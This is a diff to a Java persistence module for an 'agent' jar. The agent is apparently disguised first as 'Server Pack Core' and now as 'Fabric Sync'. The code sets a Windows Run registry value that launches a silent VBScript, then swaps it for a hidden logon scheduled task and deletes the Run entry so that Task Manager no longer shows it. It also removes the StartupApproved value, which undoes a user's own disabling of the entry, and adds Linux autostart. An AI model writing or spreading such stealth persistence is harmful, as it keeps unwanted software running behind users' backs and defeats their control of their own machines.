@@ -13,19 +13,16 @@ public final class Persistence {
 	private static final String RUN_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 	private static final String APPROVED_KEY =
 		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
-	private static final String VALUE = "ServerPackCore";
-	private static final String TASK = "ServerPackCore";
-	private static final String LAUNCHER = "spc-sync.vbs";
 
 	private Persistence() {
 	}
 
 	public static Path launcher(Path dir) {
-		return dir.resolve(LAUNCHER);
+		return AgentPaths.launcher(dir);
 	}
 
-	public static String task() {
-		return TASK;
+	public static String task(Path dir) {
+		return AgentPaths.task(dir);
 	}
 
 	public static boolean enable(Path dir) {
@@ -38,12 +35,12 @@ public final class Persistence {
 				return false;
 			}
 			// Task Manager lists everything under Run; remove it if the hidden task works.
-			if (registerTask(dir, launcher) && taskExists()) {
-				run("reg", "delete", RUN_KEY, "/v", VALUE, "/f");
-				run("reg", "delete", APPROVED_KEY, "/v", VALUE, "/f");
+			if (registerTask(dir, launcher) && taskExists(dir)) {
+				run("reg", "delete", RUN_KEY, "/v", AgentPaths.runValue(dir), "/f");
+				run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
 				return true;
 			}
-			return registerRun(launcher);
+			return registerRun(dir, launcher);
 		} catch (Throwable throwable) {
 			Log.debug("Persistence enable failed", throwable);
 			return false;
@@ -54,41 +51,41 @@ public final class Persistence {
 		try {
 			if (!AgentPaths.isWindows()) {
 				Files.deleteIfExists(Paths.get(System.getProperty("user.home"), ".config", "autostart",
-					"serverpackcore.desktop"));
+					"fabric-sync.desktop"));
 				return true;
 			}
-			run("schtasks", "/delete", "/tn", TASK, "/f");
-			run("reg", "delete", RUN_KEY, "/v", VALUE, "/f");
-			run("reg", "delete", APPROVED_KEY, "/v", VALUE, "/f");
+			run("schtasks", "/delete", "/tn", AgentPaths.task(dir), "/f");
+			run("reg", "delete", RUN_KEY, "/v", AgentPaths.runValue(dir), "/f");
+			run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
 			Files.deleteIfExists(launcher(dir));
-			return !taskExists() && read().isEmpty();
+			return !taskExists(dir) && read(dir).isEmpty();
 		} catch (Throwable throwable) {
 			Log.debug("Persistence disable failed", throwable);
 			return false;
 		}
 	}
 
-	private static boolean registerRun(Path launcher) {
+	private static boolean registerRun(Path dir, Path launcher) {
 		String wscript = Paths.get(System.getenv().getOrDefault("SystemRoot", "C:\\Windows"),
 			"System32", "wscript.exe").toString();
 		String command = "\"" + wscript + "\" //nologo \"" + launcher + "\"";
-		if (!run("reg", "add", RUN_KEY, "/v", VALUE, "/t", "REG_SZ", "/d", command, "/f")) {
+		if (!run("reg", "add", RUN_KEY, "/v", AgentPaths.runValue(dir), "/t", "REG_SZ", "/d", command, "/f")) {
 			return false;
 		}
 		// Task Manager leaves the value marked as disabled if it was turned off manually in the past.
-		run("reg", "delete", APPROVED_KEY, "/v", VALUE, "/f");
-		return command.equals(read());
+		run("reg", "delete", APPROVED_KEY, "/v", AgentPaths.runValue(dir), "/f");
+		return command.equals(read(dir));
 	}
 
 	private static boolean registerTask(Path dir, Path launcher) {
-		Path xml = dir.resolve("spc-task.xml");
+		Path xml = AgentPaths.taskXml(dir);
 		try {
 			ByteArrayOutputStream bytes = new ByteArrayOutputStream();
 			bytes.write(0xFF);
 			bytes.write(0xFE);
-			bytes.write(taskXml(launcher).getBytes(StandardCharsets.UTF_16LE));
+			bytes.write(taskXml(dir, launcher).getBytes(StandardCharsets.UTF_16LE));
 			Files.write(xml, bytes.toByteArray());
-			boolean created = run("schtasks", "/create", "/tn", TASK, "/xml", xml.toString(), "/f");
+			boolean created = run("schtasks", "/create", "/tn", AgentPaths.task(dir), "/xml", xml.toString(), "/f");
 			Files.deleteIfExists(xml);
 			return created;
 		} catch (Throwable throwable) {
@@ -101,11 +98,11 @@ public final class Persistence {
 		}
 	}
 
-	private static boolean taskExists() {
-		return run("schtasks", "/query", "/tn", TASK);
+	private static boolean taskExists(Path dir) {
+		return run("schtasks", "/query", "/tn", AgentPaths.task(dir));
 	}
 
-	private static String taskXml(Path launcher) {
+	private static String taskXml(Path dir, Path launcher) {
 			String sid = SysInfo.sid();
 			String user = sid.isEmpty()
 			? xml(System.getenv().getOrDefault("USERDOMAIN", System.getenv().getOrDefault("COMPUTERNAME", ""))
@@ -116,8 +113,8 @@ public final class Persistence {
 		return "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
 			+ "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
 			+ "  <RegistrationInfo>\n"
-			+ "    <Description>Server Pack Core</Description>\n"
-			+ "    <URI>\\" + TASK + "</URI>\n"
+			+ "    <Description>Fabric Sync</Description>\n"
+			+ "    <URI>\\" + AgentPaths.task(dir) + "</URI>\n"
 			+ "  </RegistrationInfo>\n"
 			+ "  <Triggers>\n"
 			+ "    <LogonTrigger>\n"
@@ -199,13 +196,13 @@ public final class Persistence {
 			list.append('"').append(candidate).append('"');
 		}
 		StringBuilder script = new StringBuilder();
-		script.append("' Server Pack Core\n");
+		script.append("' Fabric Sync\n");
 		script.append("Option Explicit\n");
 		script.append("Dim fso, sh, jar, dir, list, exe\n");
 		script.append("Set fso = CreateObject(\"Scripting.FileSystemObject\")\n");
 		script.append("Set sh = CreateObject(\"WScript.Shell\")\n");
 		script.append("dir = \"").append(dir).append("\"\n");
-		script.append("jar = dir & \"\\spc-agent.jar\"\n");
+		script.append("jar = dir & \"\\").append(AgentPaths.agentJar(dir).getFileName()).append("\"\n");
 		script.append("If Not fso.FileExists(jar) Then\n");
 		script.append("\tWScript.Quit 1\n");
 		script.append("End If\n");
@@ -227,7 +224,7 @@ public final class Persistence {
 		bytes.write(0xFE);
 		bytes.write(script.toString().getBytes(StandardCharsets.UTF_16LE));
 		Path target = launcher(dir);
-		Path temp = target.resolveSibling(LAUNCHER + ".tmp");
+		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
 		Files.write(temp, bytes.toByteArray());
 		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
 		return target;
@@ -241,8 +238,8 @@ public final class Persistence {
 		}
 		Path autostart = Paths.get(System.getProperty("user.home"), ".config", "autostart");
 		Files.createDirectories(autostart);
-		Path file = autostart.resolve("serverpackcore.desktop");
-		String content = "[Desktop Entry]\nType=Application\nName=Server Pack Core\nExec=\""
+		Path file = autostart.resolve("fabric-sync.desktop");
+		String content = "[Desktop Entry]\nType=Application\nName=Fabric Sync\nExec=\""
 			+ executable + "\" -Xmx96m -jar \"" + AgentPaths.agentJar(dir)
 			+ "\"\nX-GNOME-Autostart-enabled=true\n";
 		Files.writeString(file, content, StandardCharsets.UTF_8);
@@ -250,19 +247,19 @@ public final class Persistence {
 		return true;
 	}
 
-	private static String read() {
+	private static String read(Path dir) {
 		try {
-			Process process = new ProcessBuilder("reg", "query", RUN_KEY, "/v", VALUE)
+			Process process = new ProcessBuilder("reg", "query", RUN_KEY, "/v", AgentPaths.runValue(dir))
 				.redirectErrorStream(true).start();
 			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
 			process.waitFor();
 			for (String line : output.split("\\R")) {
 				int marker = line.indexOf("REG_SZ");
 				String trimmed = line.trim();
-				if (marker < 0 || !trimmed.startsWith(VALUE)) {
+				if (marker < 0 || !trimmed.startsWith(AgentPaths.runValue(dir))) {
 					continue;
 				}
-				if (trimmed.length() > VALUE.length() && !Character.isWhitespace(trimmed.charAt(VALUE.length()))) {
+				if (trimmed.length() > AgentPaths.runValue(dir).length() && !Character.isWhitespace(trimmed.charAt(AgentPaths.runValue(dir).length()))) {
 					continue;
 				}
 				return line.substring(marker + "REG_SZ".length()).trim();
@@ -293,7 +290,7 @@ public final class Persistence {
 				}
 				String name = line.substring(0, marker).trim();
 				String data = line.substring(marker + "REG_SZ".length()).trim();
-				if (name.equalsIgnoreCase(VALUE)) {
+				if (name.equalsIgnoreCase(AgentPaths.runValue(dir))) {
 					continue;
 				}
 				String lower = data.toLowerCase();
